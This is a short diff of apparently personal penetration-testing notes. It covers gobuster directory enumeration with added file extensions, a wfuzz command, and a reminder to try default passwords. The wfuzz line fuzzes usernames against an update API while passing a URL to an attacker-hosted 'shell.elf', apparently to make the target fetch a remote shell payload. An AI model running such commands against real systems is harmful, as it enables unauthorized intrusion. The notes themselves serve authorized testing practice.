@@ -9,7 +9,7 @@
 
 1.  ``` gobuster dir -u {ip} -w /usr/share/wordlists/dirb/common.txt -t 42 ```
 
-    ``` -x php ```can add filetype here
+    ``` -x html,php,aspx ```can add filetype here
 
 ### Gobuster enum API
 - Provide pattern in pattern file
@@ -91,7 +91,6 @@
 ## wFuzz
 - https://book.hacktricks.xyz/pentesting-web/web-tool-wfuzz 
 1. ``` wfuzz -c -z file,/usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -d '{"user":FUZZ,"url":"http://192.168.45.197/shell.elf"}' -H "Content-Type: application/json" -t 20 -v http://192.168.173.134:13337/update ```
-
 
 # Try Default password !!!
 
